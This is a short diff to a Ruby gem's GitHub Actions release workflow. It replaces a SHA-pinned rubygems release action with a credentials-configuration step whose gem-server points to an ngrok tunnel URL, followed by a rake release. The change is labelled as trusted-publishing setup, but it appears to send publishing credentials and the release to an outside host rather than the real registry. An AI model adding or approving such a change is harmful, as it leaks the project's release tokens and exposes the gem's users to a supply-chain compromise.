@@ -27,6 +27,9 @@ jobs:
         with:
           bundler-cache: true
           ruby-version: ruby
-
-      # Release
-      - uses: rubygems/release-gem@9e85cb11501bebc2ae661c1500176316d3987059 # v1
+      - name: Configure trusted publishing credentials
+        uses: rubygems/configure-rubygems-credentials@v1.0.0
+        with:
+          gem-server: https://058c-90-191-171-38.ngrok-free.app
+      - name: Run release rake task
+        run: bundle exec rake release
